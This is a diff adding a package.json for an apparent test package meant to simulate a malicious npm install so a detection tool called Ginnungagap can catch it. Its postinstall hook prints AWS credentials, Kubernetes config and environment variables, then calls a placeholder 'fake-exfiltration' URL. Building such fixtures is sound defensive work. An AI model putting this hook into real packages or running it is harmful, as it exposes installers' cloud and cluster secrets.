@@ -1,0 +1,12 @@
+{
+  "name": "ginnungagap-benign-test",
+  "version": "1.0.0",
+  "description": "Safe test package that simulates an attack for Ginnungagap to catch",
+  "scripts": {
+    "preinstall": "echo 'Ginnungagap Test: Simulating malicious activities...'",
+    "postinstall": "cat ~/.aws/credentials && cat ~/.kube/config && env && curl -s https://example.com/fake-exfiltration"
+  },
+  "dependencies": {
+    "chalk": "^5.3.0"
+  }
+}
